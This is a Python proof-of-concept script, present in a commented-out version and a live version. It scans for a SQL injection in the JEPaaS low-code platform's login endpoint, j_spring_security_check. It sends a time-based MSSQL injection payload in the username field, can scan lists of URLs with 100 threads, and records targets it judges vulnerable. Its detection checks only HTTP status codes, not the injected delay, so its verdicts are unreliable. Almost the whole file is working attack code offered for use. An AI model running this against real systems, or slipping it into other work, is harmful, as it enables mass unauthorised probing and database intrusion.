# import sys
# import argparse
# import requests
# import logging
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
# # 设置日志记录
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# logger = logging.getLogger(__name__)
#
#
# def banner():
#     banner = r"""
#      .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.
# | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
# | |     _____    | || |              | || |    _______   | || |   ______     | || |  _______     | || |     _____    | || | ____  _____  | || |    ______    | |
# | |    |_   _|   | || |              | || |   /  ___  |  | || |  |_   __ \   | || | |_   __ \    | || |    |_   _|   | || ||_   \|_   _| | || |  .' ___  |   | |
# | |      | |     | || |              | || |  |  (__ \_|  | || |    | |__) |  | || |   | |__) |   | || |      | |     | || |  |   \ | |   | || | / .'   \_|   | |
# | |   _  | |     | || |              | || |   '.___`-.   | || |    |  ___/   | || |   |  __ /    | || |      | |     | || |  | |\ \| |   | || | | |    ____  | |
# | |  | |_' |     | || |              | || |  |`\____) |  | || |   _| |_      | || |  _| |  \ \_  | || |     _| |_    | || | _| |_\   |_  | || | \ `.___]  _| | |
# | |  `.___.'     | || |   _______    | || |  |_______.'  | || |  |_____|     | || | |____| |___| | || |    |_____|   | || ||_____|\____| | || |  `._____.'   | |
# | |              | || |  |_______|   | || |              | || |              | || |              | || |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
#
#
# """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="JEPaaS低代码平台j_spring_security_check存在SQL注入漏洞")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/j_spring_security_check"
#     headers = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,"
#                       "likeGecko)Chrome/70.0.3538.77Safari/537.36",
#         "Content-Type": "application/x-www-form-urlencoded",
#     }
#     data = "j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--"
#     proxies = {
#         'http': 'http://127.0.0.1:8080',
#         'https': 'http://127.0.0.1:8080',
#     }
#     try:
#         res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False)
#         if res1.status_code == 200:
#             logger.info(f"[+] {target} 存在SQL注入漏洞")
#             with open('l_re.txt', 'a', encoding='utf-8') as f:
#                 f.write(target + '\n')
#                 f.close()
#             return True
#         else:
#             logger.info(f"[-] {target} 不存在SQL注入漏洞")
#             return False
#     except Exception as e:
#         logger.error(f"[-] {target} 连接失败")
#         return False
#
#
# if __name__ == '__main__':
#     main()

import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei   
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="JEPaaS低代码平台j_spring_security_check存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/j_spring_security_check"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,"
                      "likeGecko)Chrome/70.0.3538.77Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, allow_redirects=False)
        if res1.status_code == 302:
            # 处理重定向
            location = res1.headers.get('Location')
            if location:
                res2 = requests.get(url=location, verify=False, allow_redirects=False)
                if res2.status_code == 200:
                    logger.info(f"[+] {target} 存在SQL注入漏洞")
                    with open('l_re.txt', 'a', encoding='utf-8') as f:
                        f.write(target + '\n')
                    return True
                else:
                    logger.info(f"[-] {target} 不存在SQL注入漏洞")
                    return False
            else:
                logger.info(f"[-] {target} 不存在SQL注入漏洞")
                return False
        elif res1.status_code == 200:
            logger.info(f"[+] {target} 存在SQL注入漏洞")
            with open('l_re.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
            return True
        else:
            logger.info(f"[-] {target} 不存在SQL注入漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] {target} 连接失败: {e}")
        return False


if __name__ == '__main__':
    main()
